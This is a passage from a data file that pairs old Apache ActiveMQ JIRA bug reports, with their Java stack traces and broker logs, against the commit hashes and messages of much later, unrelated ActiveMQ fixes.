Reverting to ""anonymous"" clients allows the client to create a new connection, but further persistant connections from the initial clientId cannot be made until the broker is restarted.

Please contact via email:  johng@amdswireless.com for additional information, if needed.

",816e8dfe5413cf9316bf1946afe6f236d85f8351,https://issues.apache.org/jira/browse/AMQ-6002 - escape client id in virtual topic mqtt subscription; add test
12481512,AMQ-600,"During long-term operation, a remote, publish-only client with a TCP socket connection to the JMS broker will occasionally be disconnected at a low level (i.e. below the application level where JMS runs).  When this occurs, the JMS broker throws an exception indicating a broken socket, but does not release the clientID of the client to allow for reconnects.  The following stack traces should demonstrate this failure mode:

 INFO  Service                        - Async error occurred: java.net.SocketException: Connection reset
java.net.SocketException: Connection reset
        at java.net.SocketOutputStream.socketWrite(SocketOutputStream.java:96)
        at java.net.SocketOutputStream.write(SocketOutputStream.java:136)
        at org.apache.activemq.transport.tcp.TcpBufferedOutputStream.flush(TcpBufferedOutputStream.java:108)
        at java.io.DataOutputStream.flush(DataOutputStream.java:106)
        at org.apache.activemq.transport.tcp.TcpTransport.oneway(TcpTransport.java:118)
        at org.apache.activemq.transport.TransportFilter.oneway(TransportFilter.java:90)
        at org.apache.activemq.transport.WireFormatNegotiator.oneway(WireFormatNegotiator.java:65)
        at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:44)
        at org.apache.activemq.transport.ResponseCorrelator.oneway(ResponseCorrelator.java:54)
        at org.apache.activemq.broker.TransportConnection.dispatch(TransportConnection.java:212)
        at org.apache.activemq.broker.AbstractConnection.dispatchSync(AbstractConnection.java:517)
        at org.apache.activemq.broker.AbstractConnection.dispatchAsync(AbstractConnection.java:535)
        at org.apache.activemq.broker.region.TopicSubscription.dispatch(TopicSubscription.java:142)
        at org.apache.activemq.broker.region.TopicSubscription.add(TopicSubscription.java:54)
        at org.apache.activemq.broker.region.policy.SimpleDispatchPolicy.dispatch(SimpleDispatchPolicy.java:50)
        at org.apache.activemq.broker.region.Topic.dispatch(Topic.java:365)
        at org.apache.activemq.broker.region.Topic.send(Topic.java:247)
        at org.apache.activemq.broker.region.AbstractRegion.send(AbstractRegion.java:195)
        at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:312)
        at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:192)
        at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:107)
        at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:97)
        at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:119)
        at org.apache.activemq.broker.AbstractConnection.processMessage(AbstractConnection.java:336)
        at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:508)
        at org.apache.activemq.broker.AbstractConnection.service(AbstractConnection.java:189)
        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:60)
        at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:82)
        at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)
        at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:105)
        at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:77)
        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:136)
        at java.lang.Thread.run(Thread.java:595)
ACTIVEMQ_HOME: /opt/activemq
Loading message broker from: xbean:activemq.xml
INFO  BrokerService                  - ActiveMQ 4.0-M4 JMS Message Broker (localhost) is starting
INFO  BrokerService                  - For help or more information please see: http://www.logicblaze.com
INFO  JDBCPersistenceAdapter         - Database driver recognized: [apache_derby_embedded_jdbc_driver]
INFO  JournalPersistenceAdapter      - Journal Recovery Started from: Active Journal: using 5 x 20.0 Megs at: ../activemq-data/journal
INFO  JournalPersistenceAdapter      - Journal Recovered: 0 message(s) in transactions recovered.
INFO  TransportServerThreadSupport   - Listening for connections at: tcp://s1:61616
INFO  TransportConnector             - Accepting connection on: tcp://s1:61616
WARN  MulticastDiscoveryAgent        - brokerName not set
INFO  TransportServerThreadSupport   - Listening for connections at: tcp://s1:61617?wireFormat=stomp
INFO  TransportConnector             - Accepting connection on: tcp://s1:61617?wireFormat=stomp
INFO  BrokerService                  - ActiveMQ JMS Message Broker (localhost) started
INFO  NetworkConnector               - Establishing network connection between vm://localhost?network=true and null at failover:tcp://s1:61616
INFO  VMTransportFactory             - binding to broker: localhost
INFO  TransportConnector             - Accepting connection on: vm://localhost
INFO  DemandForwardingBridge         - Starting a network connection between vm://localhost#0 and unconnected has been established.
INFO  ManagementContext              - JMX consoles can connect to service:jmx:rmi:///jndi/rmi://localhost:1099/jmxrmi
INFO  DemandForwardingBridge         - Disconnecting loop back connection.
INFO  Service                        - Sync error occurred: javax.jms.InvalidClientIDException: Broker: localhost - Client: TESTClient already connected
javax.jms.InvalidClientIDException: Broker: localhost - Client: TESTClient already connected
        at org.apache.activemq.broker.region.RegionBroker.addConnection(RegionBroker.java:153)
        at org.apache.activemq.broker.BrokerFilter.addConnection(BrokerFilter.java:63)
        at org.apache.activemq.advisory.AdvisoryBroker.addConnection(AdvisoryBroker.java:66)
        at org.apache.activemq.broker.BrokerFilter.addConnection(BrokerFilter.java:63)
        at org.apache.activemq.broker.MutableBrokerFilter.addConnection(MutableBrokerFilter.java:75)
        at org.apache.activemq.broker.AbstractConnection.processAddConnection(AbstractConnection.java:478)
        at org.apache.activemq.broker.jmx.ManagedTransportConnection.processAddConnection(ManagedTransportConnection.java:82)
        at org.apache.activemq.command.ConnectionInfo.visit(ConnectionInfo.java:106)
        at org.apache.activemq.broker.AbstractConnection.service(AbstractConnection.java:189)
        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:60)
        at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:82)
        at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)
        at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:105)
        at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:77)
        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:136)
        at java.lang.Thread.run(Thread.java:595)
INFO  Service                        - Sync error occurred: javax.jms.InvalidClientIDException: Broker: localhost - Client: TESTClient already connected
javax.jms.InvalidClientIDException: Broker: localhost - Client: TESTClient already connected
        at org.apache.activemq.broker.region.RegionBroker.addConnection(RegionBroker.java:153)
        at org.apache.activemq.broker.BrokerFilter.addConnection(BrokerFilter.java:63)
        at org.apache.activemq.advisory.AdvisoryBroker.addConnection(AdvisoryBroker.java:66)
        at org.apache.activemq.broker.BrokerFilter.addConnection(BrokerFilter.java:63)
        at org.apache.activemq.broker.MutableBrokerFilter.addConnection(MutableBrokerFilter.java:75)
        at org.apache.activemq.broker.AbstractConnection.processAddConnection(AbstractConnection.java:478)
        at org.apache.activemq.broker.jmx.ManagedTransportConnection.processAddConnection(ManagedTransportConnection.java:82)
        at org.apache.activemq.command.ConnectionInfo.visit(ConnectionInfo.java:106)
        at org.apache.activemq.broker.AbstractConnection.service(AbstractConnection.java:189)
        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:60)
        at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:82)
        at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)
        at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:105)
        at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:77)
        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:136)
        at java.lang.Thread.run(Thread.java:595)
INFO  VMTransportFactory             - Shutting down VM connectors for broker: localhost
INFO  VMTransportFactory             - Shutting down VM connectors for broker: localhost
INFO  Service                        - Async error occurred: java.io.EOFException: Cannot write to the stream any more it has already been closed
java.io.EOFException: Cannot write to the stream any more it has already been closed
        at org.apache.activemq.transport.tcp.TcpBufferedOutputStream.checkClosed(TcpBufferedOutputStream.java:131)
        at org.apache.activemq.transport.tcp.TcpBufferedOutputStream.write(TcpBufferedOutputStream.java:69)
        at java.io.DataOutputStream.writeInt(DataOutputStream.java:180)
        at org.apache.activemq.openwire.OpenWireFormat.marshal(OpenWireFormat.java:169)
        at org.apache.activemq.transport.tcp.TcpTransport.oneway(TcpTransport.java:117)
        at org.apache.activemq.transport.TransportFilter.oneway(TransportFilter.java:90)
        at org.apache.activemq.transport.WireFormatNegotiator.oneway(WireFormatNegotiator.java:65)
        at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:44)
        at org.apache.activemq.transport.ResponseCorrelator.oneway(ResponseCorrelator.java:54)
        at org.apache.activemq.broker.TransportConnection.dispatch(TransportConnection.java:212)
        at org.apache.activemq.broker.AbstractConnection.dispatchSync(AbstractConnection.java:517)
        at org.apache.activemq.broker.AbstractConnection.dispatchAsync(AbstractConnection.java:535)
        at org.apache.activemq.broker.region.TopicSubscription.dispatch(TopicSubscription.java:142)
        at org.apache.activemq.broker.region.TopicSubscription.add(TopicSubscription.java:54)
        at org.apache.activemq.broker.region.policy.SimpleDispatchPolicy.dispatch(SimpleDispatchPolicy.java:50)
        at org.apache.activemq.broker.region.Topic.dispatch(Topic.java:365)
        at org.apache.activemq.broker.region.Topic.send(Topic.java:247)
        at org.apache.activemq.broker.region.AbstractRegion.send(AbstractRegion.java:195)
        at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:312)
        at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:192)
        at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:107)
        at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:97)
        at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:119)
        at org.apache.activemq.broker.AbstractConnection.processMessage(AbstractConnection.java:336)
        at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:508)
        at org.apache.activemq.broker.AbstractConnection.service(AbstractConnection.java:189)
        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:60)
        at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:82)
        at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)
        at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:105)
        at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:77)
        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:136)
        at java.lang.Thread.run(Thread.java:595)

Reverting to ""anonymous"" clients allows the client to create a new connection, but further persistant connections from the initial clientId cannot be made until the broker is restarted.

Please contact via email:  johng@amdswireless.com for additional information, if needed.

",4adc8e4f4e57a4335643f49c3072e5fd531c7f27,"https://issues.apache.org/jira/browse/AMQ-6004

Calling socketHandlerThread.interrupt() on TcpTransportServer stop to
make sure the broker shutsdown cleanly.

Patch applied with thanks to Erik Godding Boye"
12481559,AMQ-597,"If you put two messages in the MemoryBoundedMessageCache with the same message id, the MemoryBoundedMessageCache puts itself into an inconsistent state, which causes a NullPointerException in removeOldest(), on the following line:

      CacheNode node = (CacheNode) messages.remove(messageID);
      decrementMemoryUsed(node.message);

This is because there is no corresponding CacheNode entry for the given messageID.

The problem is caused by the following block of code, in put(String, ActiveMQMessage):

            CacheNode oldNode = (CacheNode) messages.put(messageID, newNode);
            if( oldNode !=null ) {
                lruList.remove(oldNode);
                decrementMemoryUsed(oldNode.message);
            }  

When it removes the existing CacheNode from the messages map, it fails to remove it from the lruList, causing its entry to be left in the lruList. This means that the lruList will now contain two entries for the same message id.  The first one to be removed will remove the only entry in the messages map, and will be fine, but the second one to be removed will cause a NullPointerException, since there is now no corresponding CacheNode in the messages map.

To fix all that needs to be done is change the line:

                lruList.remove(oldNode);

to be

                lruList.remove(oldNode.entry);

so that the entry is correctly removed from the lruList.",b7a57876102911a2a5cc406e3f85f80b28e9e16c,"AMQ-5977: Add LSB headers to init script

Add LSB headers to init script to fix problems when setting up ActiveMQ
as a daemon with chkconfig on RHEL and clones.

Signed-off-by: Gregor Zurowski <gregor@zurowski.org>"
12481497,AMQ-589,<NA>,95f58fa7c4e26b5b2d73a80bd8e1cb2bee8ebf47,"https://issues.apache.org/jira/browse/AMQ-6027

Adding back in test case now that AMQ-5898 is resolved"
12481658,AMQ-588,"When using a static+failover list for network connections, Broker shutdown is no longer working as of the 02/21/2006 SNAPSHOT release.  If a broker is attempting to connect to another broker which is not currently running, the shutdown blocks waiting for the failover connect thread to complete the connection.  Since the other broker is not running, the shutdown then hangs.

This scenario worked fine with the 02/17/2006 SNAPSHOT release.",c530b69e16372232bef19dcd353cbe91e4a511d2,"https://issues.apache.org/jira/browse/AMQ-5881

Fail the connect if the password is set but the username bit is not as
per the V3.1.1 spec requirements."
12481658,AMQ-588,"When using a static+failover list for network connections, Broker shutdown is no longer working as of the 02/21/2006 SNAPSHOT release.  If a broker is attempting to connect to another broker which is not currently running, the shutdown blocks waiting for the failover connect thread to complete the connection.  Since the other broker is not running, the shutdown then hangs.

This scenario worked fine with the 02/17/2006 SNAPSHOT release.",1b38b27ed23a5ac604e5a4dd509dd854afdfde07,"https://issues.apache.org/jira/browse/AMQ-5882

Fail to publish if the topic name in the publish packet contains a wild
card character as per the MQTT V3.1 and V3.1.1 spec."
12481658,AMQ-588,"When using a static+failover list for network connections, Broker shutdown is no longer working as of the 02/21/2006 SNAPSHOT release.  If a broker is attempting to connect to another broker which is not currently running, the shutdown blocks waiting for the failover connect thread to complete the connection.  Since the other broker is not running, the shutdown then hangs.

This scenario worked fine with the 02/17/2006 SNAPSHOT release.",8ef44452a24685dea52b0757960c1a750abd4246,"https://issues.apache.org/jira/browse/AMQ-5880

Adds a test for the issue that is ignored for now while we wait for a
fixed MQTT client release."
12481626,AMQ-587,"Sometimes when creating a temporary topic I get:

Exception in thread ""tcp:///127.0.0.1:39442"" java.lang.ClassCastException: org.apache.activemq.command.ActiveMQTempTopic
        at org.apache.activemq.openwire.v1.DestinationInfoMarshaller.unmarshal(DestinationInfoMarshaller.java:67)
        at org.apache.activemq.openwire.OpenWireFormat.doUnmarshal(OpenWireFormat.java:214)
        at org.apache.activemq.openwire.OpenWireFormat.unmarshal(OpenWireFormat.java:181)
        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:135)
        at java.lang.Thread.run(Thread.java:595)

This only seems to happen if I try to create a lot of temp topics in a lot of different threads at the same time.",ff9aae69f9da93e2b7500557649a512dddb94dca,"https://issues.apache.org/jira/browse/AMQ-5876 

Add missing license headers to the properties files."
12481626,AMQ-587,"Sometimes when creating a temporary topic I get:

Exception in thread ""tcp:///127.0.0.1:39442"" java.lang.ClassCastException: org.apache.activemq.command.ActiveMQTempTopic
        at org.apache.activemq.openwire.v1.DestinationInfoMarshaller.unmarshal(DestinationInfoMarshaller.java:67)
        at org.apache.activemq.openwire.OpenWireFormat.doUnmarshal(OpenWireFormat.java:214)
        at org.apache.activemq.openwire.OpenWireFormat.unmarshal(OpenWireFormat.java:181)
        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:135)
        at java.lang.Thread.run(Thread.java:595)

This only seems to happen if I try to create a lot of temp topics in a lot of different threads at the same time.",dc68ad89678eba9d18184f1a5342eb7ecf774596,[AMQ-5875] add queue test variant to validate shared mkahaDb remains when one dest is deleted
12483261,AMQ-585,"I am using ActiveMQ as part of a web-app deployed to Tomcat. Active MQ is configured via spring and follows the spring examples that you ship with the source in M4. If I configure the broker to use JMX (  <broker useJmx=""true""> ) and deploy the app to tomcat, everything goes fine. However, when I deploy a newer version of the app (hot deploy) I get the following error when the JMS consumer is created from spring:

006-02-20 15:16:17,378 ERROR org.springframework.web.context.ContextLoader.initWebApplicationContext(ContextLoader.java:205) Context initialization failed
org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'smsResponseConsumer' defined in ServletContext resource [/WEB-INF/applicationContext-messaging.xml]: Initialization of bean failed; nested exception is javax.jms.JMSException: org.apache.activemq:Type=Topic,Destination=ActiveMQ.Advisory.Connection,BrokerName=localhost
javax.jms.JMSException: org.apache.activemq:Type=Topic,Destination=ActiveMQ.Advisory.Connection,BrokerName=localhost

And the root cause of this exception is:

Caused by: javax.management.InstanceAlreadyExistsException: org.apache.activemq:Type=Topic,Destination=ActiveMQ.Advisory.Connection,BrokerName=localhost
	at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method)
	at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:39)
	at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:27)
	at java.lang.reflect.Constructor.newInstance(Constructor.java:274)
	at org.apache.activemq.openwire.DataStreamMarshaller.createThrowable(DataStreamMarshaller.java:199)
	at org.apache.activemq.openwire.DataStreamMarshaller.unmarsalThrowable(DataStreamMarshaller.java:159)
	at org.apache.activemq.openwire.v1.ExceptionResponseMarshaller.unmarshal(ExceptionResponseMarshaller.java:67)
	at org.apache.activemq.openwire.OpenWireFormat.doUnmarshal(OpenWireFormat.java:214)
	at org.apache.activemq.openwire.OpenWireFormat.unmarshal(OpenWireFormat.java:181)
	at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:135)
	... 1 more

So it appears as if the JMX entry isn't ""unbound"" when the applicaiton restarts on a redeploy.

If I set JMX to false then I can redeploy the application without any errors. 
",97b0619b26947c9170230e6969df13116f4a2463,[AMQ-5858] add import package
12483261,AMQ-585,"I am using ActiveMQ as part of a web-app deployed to Tomcat. Active MQ is configured via spring and follows the spring examples that you ship with the source in M4. If I configure the broker to use JMX (  <broker useJmx=""true""> ) and deploy the app to tomcat, everything goes fine. However, when I deploy a newer version of the app (hot deploy) I get the following error when the JMS consumer is created from spring:

006-02-20 15:16:17,378 ERROR org.springframework.web.context.ContextLoader.initWebApplicationContext(ContextLoader.java:205) Context initialization failed
org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'smsResponseConsumer' defined in ServletContext resource [/WEB-INF/applicationContext-messaging.xml]: Initialization of bean failed; nested exception is javax.jms.JMSException: org.apache.activemq:Type=Topic,Destination=ActiveMQ.Advisory.Connection,BrokerName=localhost
javax.jms.JMSException: org.apache.activemq:Type=Topic,Destination=ActiveMQ.Advisory.Connection,BrokerName=localhost

And the root cause of this exception is:

Caused by: javax.management.InstanceAlreadyExistsException: org.apache.activemq:Type=Topic,Destination=ActiveMQ.Advisory.Connection,BrokerName=localhost
	at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method)
	at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:39)
	at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:27)
	at java.lang.reflect.Constructor.newInstance(Constructor.java:274)
	at org.apache.activemq.openwire.DataStreamMarshaller.createThrowable(DataStreamMarshaller.java:199)
	at org.apache.activemq.openwire.DataStreamMarshaller.unmarsalThrowable(DataStreamMarshaller.java:159)
	at org.apache.activemq.openwire.v1.ExceptionResponseMarshaller.unmarshal(ExceptionResponseMarshaller.java:67)
	at org.apache.activemq.openwire.OpenWireFormat.doUnmarshal(OpenWireFormat.java:214)
	at org.apache.activemq.openwire.OpenWireFormat.unmarshal(OpenWireFormat.java:181)
	at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:135)
	... 1 more

So it appears as if the JMX entry isn't ""unbound"" when the applicaiton restarts on a redeploy.

If I set JMX to false then I can redeploy the application without any errors. 
",de5d0d9430838948196f573c5278c75fbee9f25e,"https://issues.apache.org/jira/browse/AMQ-5854

Fix intermittent test failure caused by the test reconnecting before
the failure assertion had a chance to assert the expected failure"
12481625,AMQ-581,"I push some messages onto notification.annuncio, then remove them all, and see

---> scott@jvlinux (0.24)$ ./browse --amqurl tcp://localhost:61616 notification.annuncio
ACTIVEMQ_HOME: /opt/apps/activemq

Then I push some messages on and do not consume them, and see

---> scott@jvlinux (0.08)$ ./browse --amqurl tcp://localhost:61616 notification.annuncio
ACTIVEMQ_HOME: /opt/apps/activemq
WARN  ActiveMQConnection             - Cleanup failed
javax.jms.JMSException: Cannot write to the stream any more it has already been closed
        at org.apache.activemq.util.JMSExceptionSupport.create(JMSExceptionSupport.java:57)
        at org.apache.activemq.ActiveMQConnection.asyncSendPacket(ActiveMQConnection.java:1043)
        at org.apache.activemq.ActiveMQConnection.cleanup(ActiveMQConnection.java:1191)
        at org.apache.activemq.ActiveMQConnection.transportFailed(ActiveMQConnection.java:1585)
        at org.apache.activemq.ActiveMQConnection.onException(ActiveMQConnection.java:1338)
        at org.apache.activemq.transport.TransportFilter.onException(TransportFilter.java:102)
        at org.apache.activemq.transport.TransportFilter.onException(TransportFilter.java:102)
        at org.apache.activemq.transport.TransportFilter.onException(TransportFilter.java:102)
        at org.apache.activemq.transport.TransportSupport.onException(TransportSupport.java:90)
        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:149)
        at java.lang.Thread.run(Thread.java:595)
Caused by: java.io.EOFException: Cannot write to the stream any more it has already been closed
        at org.apache.activemq.transport.tcp.TcpBufferedOutputStream.checkClosed(TcpBufferedOutputStream.java:131)
        at org.apache.activemq.transport.tcp.TcpBufferedOutputStream.write(TcpBufferedOutputStream.java:69)
        at java.io.DataOutputStream.writeInt(DataOutputStream.java:180)
        at org.apache.activemq.openwire.OpenWireFormat.marshal(OpenWireFormat.java:169)
        at org.apache.activemq.transport.tcp.TcpTransport.oneway(TcpTransport.java:117)
        at org.apache.activemq.transport.TransportFilter.oneway(TransportFilter.java:90)
        at org.apache.activemq.transport.WireFormatNegotiator.oneway(WireFormatNegotiator.java:65)
        at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:44)
        at org.apache.activemq.transport.ResponseCorrelator.oneway(ResponseCorrelator.java:54)
        at org.apache.activemq.ActiveMQConnection.asyncSendPacket(ActiveMQConnection.java:1041)
        ... 9 more
JMS_BODY_FIELD:JMSText = <AnnuncioTemplate>
  <templateID>STM07vTFzIl3gL</templateID>
  <parameterMap>
and the rest of the content of the three messages I left on the queue.

So, it appears to be successfully getting the information, but it throws an exception first.

",df06bdabdc0e9f892449e0ef0d8783aea6047802,"https://issues.apache.org/jira/browse/AMQ-5816

Apply patch from Ievgen Tarasov that ensures that the data locator is
initialized when a MessageId is deserialized."
12481570,AMQ-580,"browse when given a nonexistent queue throws an exception rather than an error message:

---> scott@jvlinux (0.08)$ ./browse --amqurl tcp://localhost:61616 notification.annuncio
ACTIVEMQ_HOME: /opt/apps/activemq
WARN  ActiveMQConnection             - Cleanup failed
org.apache.activemq.ConnectionClosedException: The connection is already closed
        at org.apache.activemq.ActiveMQConnection.asyncSendPacket(ActiveMQConnection.java:1030)
        at org.apache.activemq.ActiveMQConnection.cleanup(ActiveMQConnection.java:1191)
        at org.apache.activemq.ActiveMQConnection.transportFailed(ActiveMQConnection.java:1585)
        at org.apache.activemq.ActiveMQConnection.onException(ActiveMQConnection.java:1338)
        at org.apache.activemq.transport.TransportFilter.onException(TransportFilter.java:102)
        at org.apache.activemq.transport.TransportFilter.onException(TransportFilter.java:102)
        at org.apache.activemq.transport.TransportFilter.onException(TransportFilter.java:102)
        at org.apache.activemq.transport.TransportSupport.onException(TransportSupport.java:90)
        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:149)
        at java.lang.Thread.run(Thread.java:595)

I then push some messages onto notification.annuncio, then remove them all, and see

---> scott@jvlinux (0.24)$ ./browse --amqurl tcp://localhost:61616 notification.annuncio
ACTIVEMQ_HOME: /opt/apps/activemq

",d919db5e3d8f453c173f6ed82b1e0bce3b3df5fb,"https://issues.apache.org/jira/browse/AMQ-5804

Apply patch from Pavlo Vasylchenko"
12481554,AMQ-576,"Test case: start JVM; start embedded JMS container; send 10 persistent messages to queue; commit; stop JMS container; shutdown JVM; start JVM; start JMS container; create queue consumer; consume messages.

Result: Only one message (the last message sent) received by the consumer.

I have attached the relevant source.
",9b3d651b3851546167c14e21ab95035656e410e6,AMQ-5760: ActiveMQ - Output url to the rest api when starting AMQ
12481554,AMQ-576,"Test case: start JVM; start embedded JMS container; send 10 persistent messages to queue; commit; stop JMS container; shutdown JVM; start JVM; start JMS container; create queue consumer; consume messages.

Result: Only one message (the last message sent) received by the consumer.

I have attached the relevant source.
",32f21ff1a9f693e9f88aef71eb5b1557410b3547,"https://issues.apache.org/jira/browse/AMQ-5763

Capture the reported issue in a test case to track the fix."
12481451,AMQ-575,"here's the log


    [junit] Running org.apache.activemq.transport.QueueClusterTest
^\    [junit] Full thread dump Java HotSpot(TM) Client VM (1.5.0_05-48 mixed mode, sharing):
    [junit] 
    [junit] ""session Task"" daemon prio=7 tid=0x00540cc0 nid=0x1927200 waiting for monitor entry [0xf2d49000..0xf2d4aad0]
    [junit]     at org.apache.activemq.broker.region.Queue.dropEvent(Queue.java:263)
    [junit]     - waiting to lock <0x1c926760> (a java.util.LinkedList)
    [junit]     at org.apache.activemq.broker.region.QueueSubscription.acknowledge(QueueSubscription.java:55)
    [junit]     at org.apache.activemq.broker.region.PrefetchSubscription.acknowledge(PrefetchSubscription.java:133)
    [junit]     - locked <0x1c8c9340> (a org.apache.activemq.broker.region.QueueSubscription)
    [junit]     at org.apache.activemq.broker.region.AbstractRegion.acknowledge(AbstractRegion.java:203)
    [junit]     at org.apache.activemq.broker.region.RegionBroker.acknowledge(RegionBroker.java:329)
    [junit]     at org.apache.activemq.broker.TransactionBroker.acknowledge(TransactionBroker.java:176)
    [junit]     at org.apache.activemq.broker.BrokerFilter.acknowledge(BrokerFilter.java:59)
    [junit]     at org.apache.activemq.broker.BrokerFilter.acknowledge(BrokerFilter.java:59)
    [junit]     at org.apache.activemq.broker.MutableBrokerFilter.acknowledge(MutableBrokerFilter.java:71)
    [junit]     at org.apache.activemq.broker.AbstractConnection.processMessageAck(AbstractConnection.java:342)
    [junit]     at org.apache.activemq.command.MessageAck.visit(MessageAck.java:178)
    [junit]     at org.apache.activemq.broker.AbstractConnection.service(AbstractConnection.java:190)
    [junit]     at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:60)
    [junit]     at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:82)
    [junit]     at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)
    [junit]     at org.apache.activemq.transport.vm.VMTransport.oneway(VMTransport.java:75)
    [junit]     at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:44)
    [junit]     - locked <0x1c8180d8> (a java.lang.Object)
    [junit]     at org.apache.activemq.transport.ResponseCorrelator.oneway(ResponseCorrelator.java:54)
    [junit]     at org.apache.activemq.ActiveMQConnection.asyncSendPacket(ActiveMQConnection.java:1041)
    [junit]     at org.apache.activemq.ActiveMQSession.asyncSendPacket(ActiveMQSession.java:1617)
    [junit]     at org.apache.activemq.ActiveMQMessageConsumer.afterMessageIsConsumed(ActiveMQMessageConsumer.java:554)
    [junit]     at org.apache.activemq.ActiveMQMessageConsumer.dispatch(ActiveMQMessageConsumer.java:716)
    [junit]     at org.apache.activemq.ActiveMQSessionExecutor.dispatch(ActiveMQSessionExecutor.java:93)
    [junit]     at org.apache.activemq.ActiveMQSessionExecutor.iterate(ActiveMQSessionExecutor.java:146)
    [junit]     at org.apache.activemq.thread.SimpleTaskRunner.runTask(SimpleTaskRunner.java:110)
    [junit]     at org.apache.activemq.thread.SimpleTaskRunner.access$100(SimpleTaskRunner.java:25)
    [junit]     at org.apache.activemq.thread.SimpleTaskRunner$1.run(SimpleTaskRunner.java:43)
    [junit]     at edu.emory.mathcs.backport.java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:643)
    [junit]     at edu.emory.mathcs.backport.java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:668)
    [junit]     at java.lang.Thread.run(Thread.java:613)
    [junit] 
    [junit] ""tcp:///127.0.0.1:53756"" daemon prio=9 tid=0x00539830 nid=0x1914400 runnable [0xf2438000..0xf2438ad0]
    [junit]     at java.net.SocketInputStream.socketRead0(Native Method)
    [junit]     at java.net.SocketInputStream.read(SocketInputStream.java:129)
    [junit]     at org.apache.activemq.transport.tcp.TcpBufferedInputStream.fill(TcpBufferedInputStream.java:48)
    [junit]     at org.apache.activemq.transport.tcp.TcpBufferedInputStream.read(TcpBufferedInputStream.java:55)
    [junit]     at java.io.DataInputStream.readInt(DataInputStream.java:353)
    [junit]     at org.apache.activemq.openwire.OpenWireFormat.unmarshal(OpenWireFormat.java:180)
    [junit]     at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:135)
    [junit]     at java.lang.Thread.run(Thread.java:613)
    [junit] 
    [junit] ""tcp://localhost/127.0.0.1:53747"" prio=5 tid=0x005394c0 nid=0x1914000 in Object.wait() [0xf23b6000..0xf23b7ad0]
    [junit]     at java.lang.Object.wait(Native Method)
    [junit]     - waiting on <0x1c926f00> (a java.lang.Object)
    [junit]     at java.lang.Object.wait(Object.java:474)
    [junit]     at org.apache.activemq.thread.Valve.turnOff(Valve.java:68)
    [junit]     - locked <0x1c926f00> (a java.lang.Object)
    [junit]     at org.apache.activemq.broker.region.Queue.removeSubscription(Queue.java:171)
    [junit]     at org.apache.activemq.broker.region.AbstractRegion.removeConsumer(AbstractRegion.java:179)
    [junit]     at org.apache.activemq.broker.region.RegionBroker.removeConsumer(RegionBroker.java:280)
    [junit]     at org.apache.activemq.broker.BrokerFilter.removeConsumer(BrokerFilter.java:95)
    [junit]     at org.apache.activemq.advisory.AdvisoryBroker.removeConsumer(AdvisoryBroker.java:164)
    [junit]     at org.apache.activemq.broker.BrokerFilter.removeConsumer(BrokerFilter.java:95)
